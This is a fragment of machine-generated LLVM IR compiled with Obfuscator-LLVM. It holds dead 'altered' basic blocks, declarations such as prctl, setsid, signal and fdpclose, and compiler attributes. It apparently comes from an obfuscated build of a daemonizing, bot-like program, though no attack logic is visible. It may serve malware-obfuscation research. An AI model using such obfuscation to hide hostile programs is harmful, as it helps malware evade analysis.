  %908 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %909 = icmp eq i8* %907, %908
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %473
  call void @exit(i32 0) #14
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %500
  %910 = load i8*, i8** %25, align 8
  %911 = load i8, i8* %910, align 1
  %912 = zext i8 %911 to i32
  %913 = icmp ne i32 %912, 32
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %564
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %590
  %914 = load i8*, i8** %24, align 8
  %915 = load i8, i8* %914, align 1
  %916 = zext i8 %915 to i32
  %917 = icmp ne i32 %916, 32
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %611
  %918 = load i8*, i8** %24, align 8
  %919 = load i8, i8* %918, align 1
  %920 = zext i8 %919 to i32
  %921 = icmp ne i32 %920, 0
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %655
  %922 = load i8*, i8** %26, align 8
  %923 = call i32 @strcmp(i8* %922, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.420, i32 0, i32 0)) #10
  %924 = icmp eq i32 %923, 0
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %695
  %925 = load i32, i32* %29, align 4
  %926 = call i32 @fdpclose(i32 %925)
  call void @exit(i32 0) #14
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %722
  %927 = load i8*, i8** %32, align 8
  %928 = load i8, i8* %927, align 1
  %929 = zext i8 %928 to i32
  %930 = icmp ne i32 %929, 10
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %766
  %931 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %931, i8** %32, align 8
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %799
  %932 = load i32, i32* %33, align 4
  %_139 = sub i32 %932, 1
  %gen140 = mul i32 %_139, 1
  %_141 = shl i32 %932, 1
  %_142 = sub i32 %932, 1
  %gen143 = mul i32 %_142, 1
  %_144 = sub i32 %932, 1
  %gen145 = mul i32 %_144, 1
  %_146 = sub i32 0, %932
  %gen147 = add i32 %_146, 1
  %933 = add nsw i32 %932, 1
  store i32 %933, i32* %33, align 4
  br label %originalBB138

originalBB151alteredBB:                           ; preds = %originalBB151, %818
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %835
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %854
  %934 = load i32, i32* %3, align 4
  br label %originalBB159
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146576028}
!2 = !{i32 -2146575337}
!3 = !{i32 -2146574643}
!4 = !{i32 -2146573883}
!5 = !{i32 -2146573060}
!6 = !{i32 -2146572153}
